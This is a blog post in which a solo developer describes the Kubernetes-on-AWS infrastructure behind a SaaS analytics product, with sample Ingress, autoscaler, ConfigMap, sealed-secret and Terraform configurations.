<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/one-man-saas-architecture.png" alt="SaaS AWS architecture diagram" width="100%" height="auto" loading="lazy"></span>
<em>A high-level overview of the architecture.</em></p>
<p>It may sound complicated, but it's practically an old-school monolithic architecture running on Kubernetes. Replace Django with Rails or Laravel and you know what I'm talking about. The interesting part is how everything is glued together and automated: autoscaling, ingress, TLS certificates, failover, logging, monitoring, and so on.</p>
<p>It's worth noting I use this setup across multiple projects, which helps keep my costs down and launch experiments really easily (write a Dockerfile and git push). And since I get asked this a lot: contrary to what you might be thinking, I actually spend very little time managing the infrastructure, usually 0-2 hours per month total. Most of my time is spent developing features, doing customer support, and growing the business.</p>
<p>That said, these are the tools I’ve been using for several years now and I’m pretty familiar with them. I consider my setup simple for what it’s capable of, but it took many years of production fires at my day job to get here. So I won’t say it’s all sunshine and roses.</p>
<p>I don't know who said it first, but what I tell my friends is: "Kubernetes makes the simple stuff complex, but it also makes the complex stuff simpler".</p>
<h2 id="automatic-dns-ssl-and-load-balancing">Automatic DNS, SSL, and Load Balancing</h2>
<p>Now that you know I have a managed Kubernetes cluster on AWS and I run various projects in it, let's make the first stop of the tour: how to get traffic into the cluster.</p>
<p>My cluster is in a private network, so you won’t be able to reach it directly from the public internet. There’s a couple of pieces in between that control access and load balance traffic to the cluster.</p>
<p>Essentially, I have Cloudflare proxying all traffic to an NLB (AWS L4 Network Load Balancer). This Load Balancer is the bridge between the public internet and my private network. Once it receives a request, it forwards it to one of the Kubernetes cluster nodes. These nodes are in private subnets spread across multiple availability zones in AWS. It's all managed by the way, but more on that later.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/cloudflare-aws-ingress-kubernetes.png" alt="SaaS ingress diagram" width="100%" height="auto" loading="lazy"></span>
<em>Traffic gets cached at the edge, or forwarded to the AWS region where I operate.</em></p>
<p>"But how does Kubernetes know which service to forward the request to?" - That’s where <a href="https://github.com/kubernetes/ingress-nginx" rel="noopener" target="_blank">ingress-nginx</a> comes in. In short: it's an NGINX cluster managed by Kubernetes, and it's the entrypoint for all traffic inside the cluster.</p>
<p>NGINX applies rate-limiting and other traffic shaping rules I define before sending the request to the corresponding app container. In Panelbear’s case, the app container is Django being served by <a href="https://www.uvicorn.org/" rel="noopener" target="_blank">Uvicorn</a>.</p>
<p>It's not much different from a traditional nginx/gunicorn/Django in a VPS approach, with added horizontal scaling benefits and an automated CDN setup. It’s also a “setup once and forget” kind of thing, mostly a few files between Terraform/Kubernetes, and it’s shared by all deployed projects.</p>
<p>When I deploy a new project, it’s essentially 20 lines of ingress configuration and that’s it:</p>
<pre><div><pre><code><span>apiVersion</span><span>:</span><span> networking.k8s.io/v1beta1
</span><span></span><span>kind</span><span>:</span><span> Ingress
</span><span></span><span>metadata</span><span>:</span><span>
</span><span> </span><span>namespace</span><span>:</span><span> example
</span><span> </span><span>name</span><span>:</span><span> example</span><span>-</span><span>api
</span><span></span><span>annotations</span><span>:</span><span>
</span><span> </span><span>kubernetes.io/ingress.class</span><span>:</span><span> </span><span>"nginx"</span><span>
</span><span> </span><span>nginx.ingress.kubernetes.io/limit-rpm</span><span>:</span><span> </span><span>"5000"</span><span>
</span><span> </span><span>cert-manager.io/cluster-issuer</span><span>:</span><span> </span><span>"letsencrypt-prod"</span><span>
</span><span> </span><span>external-dns.alpha.kubernetes.io/cloudflare-proxied</span><span>:</span><span> </span><span>"true"</span><span>
</span><span></span><span>spec</span><span>:</span><span>
</span><span></span><span>tls</span><span>:</span><span>
</span><span></span><span>-</span><span> </span><span>hosts</span><span>:</span><span>
</span><span>   </span><span>-</span><span> api.example.com
</span><span> </span><span>secretName</span><span>:</span><span> example</span><span>-</span><span>api</span><span>-</span><span>tls
</span><span></span><span>rules</span><span>:</span><span>
</span><span></span><span>-</span><span> </span><span>host</span><span>:</span><span> api.example.com
</span><span> </span><span>http</span><span>:</span><span>
</span><span>   </span><span>paths</span><span>:</span><span>
</span><span>     </span><span>-</span><span> </span><span>path</span><span>:</span><span> /
</span><span>       </span><span>backend</span><span>:</span><span>
</span><span>         </span><span>serviceName</span><span>:</span><span> example</span><span>-</span><span>api
</span><span>         </span><span>servicePort</span><span>:</span><span> http</span></code></pre></div></pre>
<p>Those annotations describe that I want a DNS record, with traffic proxied by Cloudflare, a TLS certificate via letsencrypt, and that it should rate-limit the requests per minute by IP before forwarding the request to my app.</p>
<p>Kubernetes takes care of making those infra changes to reflect the desired state. It’s a little verbose, but it works well in practice.</p>
<h2 id="automated-rollouts-and-rollbacks">Automated rollouts and rollbacks</h2>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/ci-pipeline.png" alt="GitOps CI pipeline" width="100%" height="auto" loading="lazy"></span>
<em>The chain of actions that occur when I push a new commit.</em></p>
<p>Whenever I push to master one of my projects, it kicks off a CI pipeline on GitHub Actions. This pipeline runs some codebase checks, end-to-end tests (using Docker compose to setup a complete environment), and once these checks pass it builds a new Docker image that gets pushed to ECR (the Docker registry in AWS).</p>
<p>As far as the application repo is concerned, a new version of the app has been tested and is ready to be deployed as a Docker image:</p>
<pre><div><pre><code><span>panelbear/panelbear-webserver:6a54bb3</span></code></pre></div></pre>
<p>"So what happens next? There’s a new Docker image, but no deploy?" - My Kubernetes cluster has a component called <a href="https://fluxcd.io/" rel="noopener" target="_blank">flux</a>. It automatically keeps in sync what is currently running in the cluster and the latest image for my apps.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/flux-autorelease.png" alt="Fluxcd release commit" width="100%" height="auto" loading="lazy"></span>
<em>Flux automatically keeps track of new releases in my infrastructure monorepo.</em></p>
<p>Flux automatically triggers an incremental rollout when there’s a new Docker image available, and keeps record of these actions in an "Infrastructure Monorepo".</p>
<p>I want version controlled infrastructure, so that whenever I make a new commit on this repo, between Terraform and Kubernetes, they will make the necessary changes on AWS, Cloudflare and the other services to synchronize the state of my repo with what is deployed.</p>
<p>It’s all version-controlled with a linear history of every deployment made. This means less stuff for me to remember over the years, since I have no magic settings configured via clicky-clicky on some obscure UI.</p>
<p>Think of this monorepo as deployable documentation, but more on that later.</p>
<h2 id="let-it-crash">Let it crash</h2>
<p>A few years ago I used the Actor model of concurrency for various company projects, and fell in love with many of the ideas around its ecosystem. One thing led to another and soon I was reading books about Erlang, and its philosophy around <a href="https://stackoverflow.com/questions/4393197/erlangs-let-it-crash-philosophy-applicable-elsewhere" rel="noopener" target="_blank">letting things crash</a>.</p>
<p>I might be stretching the idea too much, but in Kubernetes I like to think of liveliness probes and automatic restarts as a means to achieve a similar effect.</p>
<p>From the <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/" rel="noopener" target="_blank">Kubernetes documentation</a>:
“The kubelet uses liveness probes to know when to restart a container. For example, liveness probes could catch a deadlock, where an application is running, but unable to make progress. Restarting a container in such a state can help to make the application more available despite bugs.”</p>
<p>In practice this has worked pretty well for me. Containers and nodes are meant to come and go, and Kubernetes will gracefully shift the traffic to healthy pods while healing the unhealthy ones (more like killing). Brutal, but effective.</p>
<h2 id="horizontal-autoscaling">Horizontal autoscaling</h2>
<p>My app containers auto-scale based on CPU/Memory usage. Kubernetes will try to pack as many workloads per node as possible to fully utilize it.</p>
<p>In case there’s too many Pods per node in the cluster, it will automatically spawn more servers to increase the cluster capacity and ease the load. Similarly, it will scale down when there’s not much going on.</p>
<p>Here’s what a Horizontal Pod Autoscaler might look like:</p>
<pre><div><pre><code><span>apiVersion</span><span>:</span><span> autoscaling/v1
</span><span></span><span>kind</span><span>:</span><span> HorizontalPodAutoscaler
</span><span></span><span>metadata</span><span>:</span><span>
</span><span> </span><span>name</span><span>:</span><span> panelbear</span><span>-</span><span>api
</span><span> </span><span>namespace</span><span>:</span><span> panelbear
</span><span></span><span>spec</span><span>:</span><span>
</span><span> </span><span>scaleTargetRef</span><span>:</span><span>
</span><span>   </span><span>apiVersion</span><span>:</span><span> apps/v1
</span><span>   </span><span>kind</span><span>:</span><span> Deployment
</span><span>   </span><span>name</span><span>:</span><span> panelbear</span><span>-</span><span>api
</span><span> </span><span>minReplicas</span><span>:</span><span> </span><span>2</span><span>
</span><span> </span><span>maxReplicas</span><span>:</span><span> </span><span>8</span><span>
</span><span> </span><span>targetCPUUtilizationPercentage</span><span>:</span><span> </span><span>50</span></code></pre></div></pre>
<p>In this example, it will automatically adjust the number of <code>panelbear-api</code> pods based on the CPU usage, starting at 2 replicas but capping at 8.</p>
<h2 id="static-assets-cached-by-cdn">Static assets cached by CDN</h2>
<p>When defining the ingress rules for my app, the annotation <code>cloudflare-proxied: "true"</code> is what tells the Kubernetes that I want to use Cloudflare for DNS, and to proxy all requests via it’s CDN and DDoS protection too.</p>
<p>From then on, it’s pretty easy to make use of it. I just set standard HTTP cache headers in my applications to specify which requests can be cached, and for how long.</p>
<pre><div><pre><code><span># Cache this response for 5 minutes</span><span>
</span><span>response</span><span>[</span><span>"Cache-Control"</span><span>]</span><span> </span><span>=</span><span> </span><span>"public, max-age=300"</span></code></pre></div></pre>
<p>Cloudflare will use those response headers to control the caching behavior at the edge servers. It works amazingly well for such a simple setup.</p>
<p>I use <a href="https://github.com/evansd/whitenoise" rel="noopener" target="_blank">Whitenoise</a> to serve static files directly from my app container. That way I avoid needing to upload static files to Nginx/Cloudfront/S3 on each deployment. It has worked really well so far, and most requests will get cached by the CDN as it gets filled. It's performant, and keeps things simple.</p>
<p>I also use NextJS for a few static websites, such as the landing page of <a href="http://panelbear.com/" rel="noopener" target="_blank">Panelbear</a>. I could serve it via Cloudfront/S3 or even Netlify or Vercel, but it was easy to just run it as a container in my cluster and let Cloudflare cache the static assets as they are being requested. There’s zero added cost for me to do this, and I can re-use all tooling for deployment, logging and monitoring.</p>
<h2 id="application-data-caching">Application data caching</h2>
<p>Besides static file caching, there's also application data caching (eg. results of heavy calculations, Django models, rate-limiting counters, etc...).</p>
<p>On one hand I leverage an in-memory <a href="https://docs.python.org/3/library/functools.html#functools.lru_cache" rel="noopener" target="_blank">Least Recently Used (LRU) cache</a> to keep frequently accessed objects in memory, and I’d benefit from zero network calls (pure Python, no Redis involved).</p>
<p>However, most endpoints just use the in-cluster Redis for caching. It's still fast and the cached data can be shared by all Django instances, even after re-deploys, while an in-memory cache would get wiped.</p>
<p>Here's a real-world example:</p>
<p>My Pricing Plans are based on analytics events per month. For this some sort of metering is necessary to know how many events have been consumed within the current billing period and enforce limits. However, I don't interrupt the service immediately when a customer crosses the limit. Instead a "Capacity depleted" email is automatically sent, and a grace period is given to the customer before the API starts rejecting new data.</p>
<p>This is meant to give customers enough time to decide if an upgrade makes sense for them, while ensuring no data is lost. For example during a traffic spike in case their content goes viral or if they're just enjoying the weekend and not checking their emails. If the customer decides to stay in the current plan and not upgrade, there is no penalty and things will go back to normal once usage is back within their plan limits.</p>
<p>So for this feature I have a function that applies the rules above, which require several calls to the DB and ClickHouse, but get cached 15 minutes to avoid recomputing this on every request. It's good enough and simple. Worth noting: the cache gets invalidated on plan changes, otherwise it might take 15 minutes for an upgrade to take effect.</p>
<pre><div><pre><code><span>@cache</span><span>(</span><span>ttl</span><span>=</span><span>60</span><span> </span><span>*</span><span> </span><span>15</span><span>)</span><span>
</span><span></span><span>def</span><span> </span><span>has_enough_capacity</span><span>(</span><span>site</span><span>:</span><span> Site</span><span>)</span><span> </span><span>-</span><span>&gt;</span><span> </span><span>bool</span><span>:</span><span>
</span><span> </span><span>"""
</span><span> Returns True if a Site has enough capacity to accept incoming events,
</span><span> or False if it already went over the plan limits, and the grace period is over.
</span><span> """</span></code></pre></div></pre>
<h2 id="per-endpoint-rate-limiting">Per endpoint rate-limiting</h2>
<p>While I enforce global rate limits at the nginx-ingress on Kubernetes, I sometimes want more specific limits on a per endpoint/method basis.</p>
<p>For that I use the excellent <a href="https://django-ratelimit.readthedocs.io/en/stable/" rel="noopener" target="_blank">Django Ratelimit</a> library to easily declare the limits per Django view. It's configured to use Redis as a backend for keeping track of the clients making the requests to each endpoint (it stores a hash based on the client key, and not the IP).</p>
<p>For example:</p>
<pre><div><pre><code><span>class</span><span> </span><span>MySensitiveActionView</span><span>(</span><span>RatelimitMixin</span><span>,</span><span> LoginRequiredMixin</span><span>)</span><span>:</span><span>
</span><span> ratelimit_key </span><span>=</span><span> </span><span>"user_or_ip"</span><span>
</span><span> ratelimit_rate </span><span>=</span><span> </span><span>"5/m"</span><span>
</span><span> ratelimit_method </span><span>=</span><span> </span><span>"POST"</span><span>
</span><span> ratelimit_block </span><span>=</span><span> </span><span>True</span><span>
</span>
<span> </span><span>def</span><span> </span><span>get</span><span>(</span><span>)</span><span>:</span><span>
</span><span>   </span><span>.</span><span>.</span><span>.</span><span>
</span>
<span> </span><span>def</span><span> </span><span>post</span><span>(</span><span>)</span><span>:</span><span>
</span><span>   </span><span>.</span><span>.</span><span>.</span></code></pre></div></pre>
<p>In the example above, if the client attempts to POST to this particular endpoint more than 5 times per minute, the subsequent call will get rejected with a <code>HTTP 429 Too Many Requests</code> status code.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-rate-limited.png" alt="Rate limited HTTP error" width="100%" height="auto" loading="lazy"></span>
<em>The friendly error message you'd get when being rate-limited.</em></p>
<h2 id="app-administration">App administration</h2>
<p>Django gives me an admin panel for all my models for free. It’s built-in, and It’s pretty handy for inspecting data for customer support work on the go.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-staff.png" alt="Django admin panel" width="100%" height="auto" loading="lazy"></span>
<em>Django's built-in admin panel is very useful for doing customer support on the go.</em></p>
<p>I added actions to help me manage things from the UI. Things like blocking access to suspicious accounts, sending out announcement emails, and approving full account deletion requests (first a soft delete, and within 72 hours a full destroy).</p>
<p>Security-wise: only staff users are able to access the panel (me), and I’m planning to add 2FA for extra security on all accounts.</p>
<p>Additionally every time a user logs in, I send an automatic security email with details about the new session to the account’s email. Right now I send it on every new login, but I might change it in the future to skip known devices. It’s not a very “MVP feature”, but I care about security and it was not complicated to add. At least I’d be warned if someone logged in to my account.</p>
<p>Of course, there's a lot more to hardening an application than this, but that's out of the scope of this post.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-security-email.png" alt="Panelbear security email notification" width="100%" height="auto" loading="lazy"></span>
<em>Example security activity email you might receive when logging in.</em></p>
<h2 id="running-scheduled-jobs">Running scheduled jobs</h2>
<p>Another interesting use case is that I run a lot of different scheduled jobs as part of my SaaS. These are things like generating daily reports for my customers, calculating usage stats every 15 minutes, sending staff emails (I get a daily email with the most important metrics) and whatnot.</p>
<p>My setup is actually pretty simple, I just have a few Celery workers and a Celery beat scheduler running in the cluster. They are configured to use Redis as the task queue. It took me an afternoon to set it up once, and luckily I haven’t had any issues so far.</p>
<p>I want to get notified via SMS/Slack/Email when a scheduled task is not running as expected. For example when the weekly reports task is stuck or significantly delayed. For that I use <a href="https://cronitor.io/" rel="noopener" target="_blank">Cronitor.io</a>.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/cron-job-monitoring.png" alt="Cronitor.io cron job monitoring dashboard" width="100%" height="auto" loading="lazy"></span>
<em>The cron job monitoring dashboard from Cronitor.io</em></p>
<p>The <a href="https://github.com/cronitorio/cronitor-python" rel="noopener" target="_blank">celery monitoring integration</a> makes it super easy to instrument my scheduled tasks:</p>
<pre><div><pre><code><span># Auto-discovers celery beat tasks</span><span>
</span>
<span></span><span>import</span><span> cronitor</span><span>.</span><span>celery
</span><span></span><span>from</span><span> celery </span><span>import</span><span> Celery
</span>
<span>app </span><span>=</span><span> Celery</span><span>(</span><span>)</span><span>
</span><span>cronitor</span><span>.</span><span>celery</span><span>.</span><span>initialize</span><span>(</span><span>app</span><span>,</span><span> api_key</span><span>=</span><span>"super-secret"</span><span>,</span><span> celerybeat_only</span><span>=</span><span>True</span><span>)</span></code></pre></div></pre>
<h2 id="app-configuration">App configuration</h2>
<p>All my applications are configured via environment variables, old school but portable and well supported. For example, in my Django <code>settings.py</code> I’d setup a variable with a default value:</p>
<pre><div><pre><code><span>INVITE_ONLY </span><span>=</span><span> env</span><span>.</span><span>str</span><span>(</span><span>"INVITE_ONLY"</span><span>,</span><span> default</span><span>=</span><span>False</span><span>)</span></code></pre></div></pre>
<p>And use it anywhere in my code like this:</p>
<pre><div><pre><code><span>from</span><span> django</span><span>.</span><span>conf </span><span>import</span><span> settings
</span>
<span></span><span># If invite-only, then disable account creation endpoints</span><span>
</span><span></span><span>if</span><span> settings</span><span>.</span><span>INVITE_ONLY</span><span>:</span><span>
</span><span> </span><span>.</span><span>.</span><span>.</span></code></pre></div></pre>
<p>I can override the environment variable in my Kubernetes <code>configmap</code>:</p>
<pre><div><pre><code><span>apiVersion</span><span>:</span><span> v1
</span><span></span><span>kind</span><span>:</span><span> ConfigMap
</span><span></span><span>metadata</span><span>:</span><span>
</span><span> </span><span>namespace</span><span>:</span><span> panelbear
</span><span> </span><span>name</span><span>:</span><span> panelbear</span><span>-</span><span>webserver</span><span>-</span><span>config
</span><span></span><span>data</span><span>:</span><span>
</span><span> </span><span>INVITE_ONLY</span><span>:</span><span> </span><span>"True"</span><span>
</span><span> </span><span>DEFAULT_FROM_EMAIL</span><span>:</span><span> </span><span>"The Panelbear Team &lt;support@panelbear.com&gt;"</span><span>
</span><span> </span><span>SESSION_COOKIE_SECURE</span><span>:</span><span> </span><span>"True"</span><span>
</span><span> </span><span>SECURE_HSTS_PRELOAD</span><span>:</span><span> </span><span>"True"</span><span>
</span><span> </span><span>SECURE_SSL_REDIRECT</span><span>:</span><span> </span><span>"True"</span></code></pre></div></pre>
<h2 id="keeping-secrets">Keeping secrets</h2>
<p>The way secrets are handled is pretty interesting: I want to also commit them to my infrastructure repo, alongside other config files, but secrets should be encrypted.</p>
<p>For that I use <a href="https://github.com/bitnami-labs/sealed-secrets" rel="noopener" target="_blank">kubeseal</a> in Kubernetes. This component uses asymmetric crypto to encrypt my secrets, and only a cluster authorized to access the decryption keys can decrypt them.</p>
<p>For example this is what you might find in my infrastructure repo:</p>
<pre><div><pre><code><span>apiVersion</span><span>:</span><span> bitnami.com/v1alpha1
</span><span></span><span>kind</span><span>:</span><span> SealedSecret
</span><span></span><span>metadata</span><span>:</span><span>
</span><span> </span><span>name</span><span>:</span><span> panelbear</span><span>-</span><span>secrets
</span><span> </span><span>namespace</span><span>:</span><span> panelbear
</span><span></span><span>spec</span><span>:</span><span>
</span><span> </span><span>encryptedData</span><span>:</span><span>
</span><span>   </span><span>DATABASE_CONN_URL</span><span>:</span><span> AgBy3i4OJSWK+PiTySYZZA9rO43cGDEq</span><span>...</span><span>
</span><span>   </span><span>SESSION_COOKIE_SECRET</span><span>:</span><span> oi7ySY1ZA9rO43cGDEq+ygByri4OJBlK</span><span>...</span><span>
</span><span>   </span><span>...</span></code></pre></div></pre>
<p>The cluster will automatically decrypt the secrets and pass them to the corresponding container as an environment variable:</p>
<pre><div><pre><code><span>DATABASE_CONN_URL</span><span>=</span><span>'postgres://user:pass@my-rds-db:5432/db'</span><span>
</span><span>SESSION_COOKIE_SECRET</span><span>=</span><span>'this-is-supposed-to-be-very-secret'</span></code></pre></div></pre>
<p>To protect the secrets within the cluster, I use AWS-managed encryption keys via <a href="https://aws.amazon.com/kms/" rel="noopener" target="_blank">KMS</a>, which are rotated regularly. This is a single setting when creating the Kubernetes cluster, and it's fully managed.</p>
<p>Operationally what this means is that I write the secrets as environment variables in a Kubernetes manifest, I then run a command to encrypt them before committing, and push my changes.</p>
<p>The secrets are deployed within a few seconds, and the cluster will take care of automatically decrypting them before running my containers.</p>
<h2 id="relational-data-postgres">Relational data: Postgres</h2>
<p>For experiments I run a vanilla Postgres container within the cluster, and a Kubernetes cronjob that does daily backups to S3. This helps keep my costs down, and it’s pretty simple for just starting out.</p>
<p>However, as a project grows, like Panelbear, I move the database out of the cluster into RDS, and let AWS take care of encrypted backups, security updates and all the other stuff that’s no fun to mess up.</p>
<p>For added security, the databases managed by AWS are still deployed within my private network, so they’re unreachable via the public internet.</p>
<h2 id="columnar-data-clickhouse">Columnar data: ClickHouse</h2>
<p>I rely on <a href="https://clickhouse.tech/" rel="noopener" target="_blank">ClickHouse</a> for efficient storage and (soft) real-time queries over the analytics data in Panelbear. It’s a fantastic columnar database, incredibly fast and when you structure your data well you can achieve high compression ratios (less storage costs = higher margins).</p>
<p>I currently self-host a ClickHouse instance within my Kubernetes cluster. I use a StatefulSet with encrypted volume keys managed by AWS. I have a Kubernetes CronJob that periodically backups up all data in an efficient columnar format to S3. In case of disaster recovery, I have a couple of scripts to manually backup and restore the data from S3.</p>
<p>ClickHouse has been rock-solid so far, and it’s an impressive piece of software. It’s the only tool I wasn’t already familiar with when I started my SaaS, but thanks to their docs I was able to get up and running pretty quickly.</p>
<p>I think there’s a lot of low hanging fruit in case I wanted to squeeze out even more performance (eg. optimizing the field types for better compression, pre-computing materialized tables and tuning the instance type), but it’s good enough for now.</p>
<h2 id="dns-based-service-discovery">DNS-based service discovery</h2>
<p>Besides Django, I also run containers for Redis, ClickHouse, NextJS, among other things. These containers have to talk to each other somehow, and that somehow is via the built-in service discovery in Kubernetes.</p>
<p>It’s pretty simple: I define a Service resource for the container and Kubernetes automatically manages DNS records within the cluster to route traffic to the corresponding service.</p>
<p>For example, given a Redis service exposed within the cluster:</p>
<pre><div><pre><code><span>apiVersion</span><span>:</span><span> v1
</span><span></span><span>kind</span><span>:</span><span> Service
</span><span></span><span>metadata</span><span>:</span><span>
</span><span> </span><span>name</span><span>:</span><span> redis
</span><span> </span><span>namespace</span><span>:</span><span> weekend</span><span>-</span><span>project
</span><span></span><span>labels</span><span>:</span><span>
</span><span> </span><span>app</span><span>:</span><span> redis
</span><span></span><span>spec</span><span>:</span><span>
</span><span> </span><span>type</span><span>:</span><span> ClusterIP
</span><span> </span><span>ports</span><span>:</span><span>
</span><span>   </span><span>-</span><span> </span><span>port</span><span>:</span><span> </span><span>6379</span><span>
</span><span> </span><span>selector</span><span>:</span><span>
</span><span>   </span><span>app</span><span>:</span><span> redis</span></code></pre></div></pre>
<p>I can access this Redis instance anywhere from my cluster via the following URL:</p>
<pre><div><pre><code><span>redis://redis.weekend-project.svc.cluster:6379</span></code></pre></div></pre>
<p>Notice the service name and the project namespace is part of the URL. That makes it really easy for all your cluster services to talk to each other, regardless of where in the cluster they run.</p>
<p>For example, here’s how I’d configure Django via environment variables to use my in-cluster Redis:</p>
<pre><div><pre><code><span>apiVersion</span><span>:</span><span> v1
</span><span></span><span>kind</span><span>:</span><span> ConfigMap
</span><span></span><span>metadata</span><span>:</span><span>
</span><span> </span><span>name</span><span>:</span><span> panelbear</span><span>-</span><span>config
</span><span> </span><span>namespace</span><span>:</span><span> panelbear
</span><span></span><span>data</span><span>:</span><span>
</span><span> </span><span>CACHE_URL</span><span>:</span><span> </span><span>"redis://redis.panelbear.svc.cluster:6379/0"</span><span>
</span><span> </span><span>ENV</span><span>:</span><span> </span><span>"production"</span><span>
</span><span> </span><span>...</span></code></pre></div></pre>
<p>Kubernetes will automatically keep the DNS records in-sync with healthy pods, even as containers get moved across nodes during autoscaling. The way this works behind the scenes is pretty interesting, but out of the scope of this post. <a href="https://medium.com/google-cloud/understanding-kubernetes-networking-services-f0cb48e4cc82" rel="noopener" target="_blank">Here’s a good explanation</a> in case you find it interesting.</p>
<h2 id="version-controlled-infrastructure">Version-controlled infrastructure</h2>
<p>I want version-controlled, reproducible infrastructure that I can create and destroy with a few simple commands.</p>
<p>To achieve this, I use Docker, Terraform and Kubernetes manifests in a monorepo that contains all-things infrastructure, even across multiple projects. And for each application/project I use a separate git repo, but this code is not aware of the environment it will run on.</p>
<p>If you’re familiar with <a href="https://12factor.net/" rel="noopener" target="_blank">The Twelve-Factor App</a> this separation may ring a bell or two. Essentially, my application has no knowledge of the exact infrastructure it will run on, and is configured via environment variables.</p>
<p>By describing my infrastructure in a git repo, I don’t need to keep track of every little resource and configuration setting in some obscure UI. This enables me to restore my entire stack with a single command in case of disaster recovery.</p>
<p>Here’s an example folder structure of what you might find on the infra monorepo:</p>
<pre><div><pre><code><span># Cloud resources
</span>terraform/
<!-- -->aws/
<!-- --> rds.tf
<!-- --> ecr.tf
<!-- --> eks.tf
<!-- --> lambda.tf
<!-- --> s3.tf
<!-- --> roles.tf
<!-- --> vpc.tf
<!-- -->cloudflare/
<!-- --> projects.tf
<!-- -->
<!-- --># Kubernetes manifests
<!-- -->manifests/
<!-- --> cluster/
<!-- -->   ingress-nginx/
<!-- -->   external-dns/
<!-- -->   certmanager/
<!-- -->   monitoring/
<!-- -->
<!-- --> apps/
<!-- -->   panelbear/
<!-- -->     webserver.yaml
<!-- -->     celery-scheduler.yaml
<!-- -->     celery-workers.yaml
<!-- -->     secrets.encrypted.yaml
<!-- -->     ingress.yaml
<!-- -->     redis.yaml
<!-- -->     clickhouse.yaml
<!-- -->   another-saas/
<!-- -->   my-weekend-project/
<!-- -->   some-ghost-blog/
<!-- -->
<!-- --># Python scripts for disaster recovery, and CI
<!-- -->tasks/
<!-- --> ...
<!-- -->
<!-- --># In case of a fire, some help for future me
<!-- -->README.md
<!-- -->DISASTER.md
<!-- -->TROUBLESHOOTING.md</code></pre></div></pre>
<p>Another advantage of this setup is that all the moving pieces are described in one place. I can configure and manage reusable components like centralized logging, application monitoring, and encrypted secrets to name a few.</p>
<h2 id="terraform-for-cloud-resources">Terraform for cloud resources</h2>
<p>I use <a href="https://www.terraform.io/" rel="noopener" target="_blank">Terraform</a> to manage most of the underlying cloud resources. This helps me document, and keep track of the resources and configuration that makes up my infrastructure. In case of disaster recovery, I can spin up and rollback resources with a single command.</p>
<p>For example, here's one of my Terraform files for creating a private S3 bucket for encrypted backups which expire after 30 days:</p>
<pre><div><pre><code><span>resource </span><span>"aws_s3_bucket"</span><span> </span><span>"panelbear_app"</span><span> </span><span>{</span><span>
</span><span> bucket </span><span>=</span><span> </span><span>"panelbear-app"</span><span>
</span><span> acl    </span><span>=</span><span> </span><span>"private"</span><span>
</span>
<span> tags </span><span>=</span><span> </span><span>{</span><span>
</span><span>   </span><span>Name</span><span>        </span><span>=</span><span> </span><span>"panelbear-app"</span><span>
</span><span>   </span><span>Environment</span><span> </span><span>=</span><span> </span><span>"production"</span><span>
</span><span> </span><span>}</span><span>
</span>
<span> lifecycle_rule </span><span>{</span><span>
</span><span>   id      </span><span>=</span><span> </span><span>"backups"</span><span>
</span><span>   enabled </span><span>=</span><span> </span><span>true</span><span>
</span><span>   prefix  </span><span>=</span><span> </span><span>"backups/"</span><span>
</span>
<span>   expiration </span><span>{</span><span>
</span><span>     days </span><span>=</span><span> </span><span>30</span><span>
</span><span>   </span><span>}</span><span>
</span><span> </span><span>}</span><span>
</span>
<span> server_side_encryption_configuration </span><span>{</span><span>
</span><span>   rule </span><span>{</span><span>
</span><span>     apply_server_side_encryption_by_default </span><span>{</span><span>
</span><span>       sse_algorithm     </span><span>=</span><span> </span><span>"AES256"</span><span>
</span><span>     </span><span>}</span><span>
</span><span>   </span><span>}</span><span>
</span><span> </span><span>}</span><span>
</span><span></span><span>}</span></code></pre></div></pre>
<h2 id="kubernetes-manifests-for-app-deployments">Kubernetes manifests for app deployments</h2>
<p>Similarly, all my Kubernetes manifests are described in YAML files in the infrastructure monorepo. I have split them into two directories: <code>cluster</code> and <code>apps</code>.</p>
<p>Inside the <code>cluster</code> directory I describe all cluster-wide services and configuration, things like the nginx-ingress, encrypted secrets, prometheus scrapers, and so on. Essentially the reusable bits.</p>
<p>On the other hand, the <code>apps</code> directory contains one namespace per project, describing what is needed to deploy it (ingress rules, deployments, secrets, volumes, and so on).</p>
<p>One of the cool things about Kubernetes, is that you can customize almost everything about your stack. So for example, if I wanted to use encrypted SSD volumes that can be resized, I could define a new “StorageClass'' in the cluster. Kubernetes and in this case AWS will coordinate and make the magic happen for me. For example:</p>
<pre><div><pre><code><span>apiVersion</span><span>:</span><span> storage.k8s.io/v1
</span><span></span><span>kind</span><span>:</span><span> StorageClass
</span><span></span><span>metadata</span><span>:</span><span>
</span><span> </span><span>name</span><span>:</span><span> encrypted</span><span>-</span><span>ssd
</span><span> </span><span>provisioner</span><span>:</span><span> kubernetes.io/aws</span><span>-</span><span>ebs
</span><span></span><span>parameters</span><span>:</span><span>
</span><span> </span><span>type</span><span>:</span><span> gp2
</span><span> </span><span>encrypted</span><span>:</span><span> </span><span>"true"</span><span>
</span><span> </span><span>reclaimPolicy</span><span>:</span><span> Retain
</span><span> </span><span>allowVolumeExpansion</span><span>:</span><span> </span><span>true</span><span>
</span><span> </span><span>volumeBindingMode</span><span>:</span><span> WaitForFirstConsumer</span></code></pre></div></pre>
<p>I can now go ahead and attach this type of persistent storage for any of my deployments, and Kubernetes will manage the requested resources for me:</p>
<pre><div><pre><code><span># Somewhere in the ClickHouse StatefulSet configuration</span><span>
</span><span></span><span>...</span><span>
</span><span></span><span>storageClassName</span><span>:</span><span> encrypted</span><span>-</span><span>ssd
</span><span></span><span>resources</span><span>:</span><span>
</span><span> </span><span>requests</span><span>:</span><span>
</span><span>   </span><span>storage</span><span>:</span><span> 250Gi
</span><span></span><span>...</span></code></pre></div></pre>
<h2 id="subscriptions-and-payments">Subscriptions and Payments</h2>
<p>I use <a href="https://stripe.com/payments/checkout" rel="noopener" target="_blank">Stripe Checkout</a> to save all the work in handling payments, creating checkout screens, handling 3D secure requirements from credit cards, and even the customer billing portal.</p>
<p>I do not have access to the payment information itself, which is a huge relief and enables me to focus on my product instead of highly sensitive topics like credit card handling and <a href="https://stripe.com/radar" rel="noopener" target="_blank">fraud prevention</a>.</p>
